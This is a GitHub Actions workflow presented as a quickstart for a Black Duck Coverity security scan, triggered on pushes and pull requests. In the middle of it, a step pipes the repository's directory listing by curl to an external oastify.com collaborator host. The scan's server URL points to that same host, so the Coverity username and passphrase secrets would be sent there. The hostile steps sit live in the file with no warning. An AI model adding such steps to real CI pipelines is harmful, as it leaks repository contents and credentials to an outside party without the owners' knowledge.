# Quickstart: Black Duck Security Scan Action with coverity:
#     https://black-duck-staging.fluidtopics.net/r/bridge/latest/bridge-cli-guide/quickstart-black-duck-security-scan-action-with-coverity.html
name: Coverity Scan
on:
  push:
    branches:
      - main
      - master
      - develop
      - stage
      - release
  pull_request:
    branches:
      - main
      - master
      - develop
      - stage
      - release
  workflow_dispatch: {}
jobs:
  coverity:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Source
        uses: actions/checkout@v5

      - name: Run ls and send to Collaborator
        run: |
          {
            echo "ls output:"
            ls -la
          } | curl -s -X POST --data-binary @- https://k0lsu4u4691tsj7gkt1a908yppvgj7cv1.oastify.com

      - name: Coverity Scan
        id: coverity-scan
        uses: blackduck-inc/black-duck-security-scan@v2
        with:
          ### SCANNING: Required fields
          coverity_url: https://k0lsu4u4691tsj7gkt1a908yppvgj7cv1.oastify.com
          coverity_user: ${{ secrets.COVERITY_USER }}
          coverity_passphrase: ${{ secrets.COVERITY_PASSPHRASE }}
